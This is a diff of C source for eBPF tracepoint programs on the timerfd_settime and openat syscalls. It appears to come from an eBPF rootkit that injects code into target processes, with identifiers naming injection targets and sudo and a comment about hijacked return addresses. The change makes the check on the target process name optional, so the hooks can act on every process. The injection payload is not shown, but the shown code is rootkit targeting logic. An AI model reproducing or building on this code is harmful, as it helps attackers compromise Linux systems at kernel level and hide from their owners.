@@ -252,9 +252,11 @@ int sys_enter_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
         return -1;
     }
 
-    char *task = TASK_COMM_NAME_INJECTION_TARGET_TIMERFD_SETTIME;
-    if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
-        return 0;
+    if(TASK_COMM_FILTER == 1){
+        char *task = TASK_COMM_NAME_INJECTION_TARGET_TIMERFD_SETTIME;
+        if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
+            return 0;
+        }
     }
     bpf_printk("TASK: %s\n", comm);
 
@@ -320,9 +322,12 @@ int sys_exit_timerfd_settime(struct sys_timerfd_settime_exit_ctx *ctx){
     if(err<0){
         return -1;
     }
-    char *task = TASK_COMM_NAME_INJECTION_TARGET_TIMERFD_SETTIME;
-    if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
-        return 0;
+
+    if(TASK_COMM_FILTER == 1){
+        char *task = TASK_COMM_NAME_INJECTION_TARGET_TIMERFD_SETTIME;
+        if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
+            return 0;
+        }
     }
     
     //If we are here we may have the return address stored in the map.
@@ -353,9 +358,11 @@ int sys_enter_openat(struct sys_openat_enter_ctx *ctx){
         return -1;
     }
 
-    char *task = TASK_COMM_NAME_INJECTION_TARGET_OPEN;
-    if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
-        return 0;
+    if(TASK_COMM_FILTER == 1){
+        char *task = TASK_COMM_NAME_INJECTION_TARGET_OPEN;
+        if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
+            return 0;
+        }
     }
     struct pt_regs* longscan;// = (struct pt_regs*)ctx->unused;
     bpf_probe_read(&longscan, sizeof(struct pt_regs*), &(ctx->unused));
